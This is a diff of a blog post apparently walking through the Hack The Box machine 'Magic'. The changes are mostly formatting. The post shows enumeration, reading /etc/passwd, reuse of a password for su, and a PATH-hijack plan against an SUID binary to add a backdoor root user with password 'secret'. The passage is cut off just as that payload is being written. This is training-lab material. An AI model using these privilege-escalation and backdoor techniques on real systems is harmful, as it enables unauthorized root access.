@@ -13,7 +13,7 @@ I decided to go back to Linux for my next challenge box from TJNull's [list of O
 
 ## Phase 1: Enumeration
 
-Step 1: Kick off [AutoRecon][autorecon]
+Step 1: Kick off [AutoRecon][autorecon].
 
 ```bash
 autorecon -o magic --single-target 10.10.10.185 
@@ -41,7 +41,7 @@ ffuf -u http://10.10.10.185/FUZZ -w /usr/share/seclists/Discovery/Web-Content/ra
 
 This run ended up identifying the same endpoints that the `autorecon` GoBuster run identified. The interesting ones were:
 
-```txt
+```
 /login.php            (Status: 200) [Size: 4221]
 /upload.php           (Status: 302) [Size: 2957] [--> login.php]
 ```
@@ -111,13 +111,13 @@ www-data@ubuntu:/var/www/Magic/images/uploads$
 
 Now that I have a shell on the box, the next step is to escalate privileges. A quick `cat /etc/passwd` shows that there is one non-standard user on this host
 
-```txt
+```
 theseus:x:1000:1000:Theseus,,,:/home/theseus:/bin/bash
 ```
 
 Seems like this theseus is also a user on this machine... what are the odds he uses the same password from the web application.
 
-```txt
+```bash
 www-data@ubuntu:/tmp$ su theseus
 Password:
 theseus@ubuntu:/tmp$
@@ -125,7 +125,7 @@ theseus@ubuntu:/tmp$
 
 Sweet! Now that I have access to the user account, it is time to move onto getting root privileges. When I ran [linpeas][linpeas] something new stood out to me, there was a new SUID binary that I hadn't encountered before.
 
-```txt
+```
 -rwsr-x--- 1 root    users            22K Oct 21  2019 /bin/sysinfo (Unknown SUID binary)
 ----------------------------------------------------------------------------------------
   --- Trying to execute /bin/sysinfo with strace in order to look for hijackable libraries...
@@ -153,7 +153,7 @@ theseus@ubuntu:/tmp$ ltrace sysinfo
 popen("fdisk -l", "r")
 ```
 
-This call is interesting because the program doesn't specify the full path of the `fdisk` binary that it calls. This means that I can place an arbitrary `fdisk` executable file somewhere in the PATH before the intended `fdisk` executable, and have my file execute as root instead. My go-to for boot2root files is adding a backdoor root user with the password "secret".
+This call is interesting because the program doesn't specify the full path of the `fdisk` binary that it calls. This means that I can place an arbitrary `fdisk` executable file somewhere in the PATH before the intended `fdisk` executable, and have my file execute as root instead. I would never do this on a client machine, but my go-to "backdoor" for boot2root files is adding a root user with the password "secret".
 
 ```bash
 theseus@ubuntu:/tmp$ echo -e '#!/bin/bash
